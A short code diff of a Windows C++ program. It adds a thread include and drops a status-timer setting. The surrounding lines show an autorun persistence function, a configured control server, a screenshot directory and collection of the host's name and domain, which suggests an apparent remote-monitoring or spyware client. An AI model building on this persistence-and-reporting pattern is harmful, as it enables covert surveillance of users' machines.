@@ -6,6 +6,7 @@
 #include <Lmwksta.h>
 #include <StrSafe.h>
 #include <vector>
+#include <thread>
 using namespace std;
 
 int generator = 1;
@@ -124,6 +125,7 @@ bool addToAurorun(const wstring& programName, const wstring& executablePath) {
     return true;
 }
 
+
 int main() {
     addToAurorun(L"Exe", getExecProgramPath());
 
@@ -133,7 +135,6 @@ int main() {
     string server_ip = conf["control_server"].substr(0, conf["control_server"].find(":"));
     int server_port = atoi(conf["control_server"].substr(conf["control_server"].find(":") + 1).c_str());
     string screenshot_dir = conf["screenshot_dir"];
-    int send_status_timer = atoi(conf["timer_send_status"].c_str());
     string host_name = getPCName();
     string host_domain_name = getPCDomain();
 
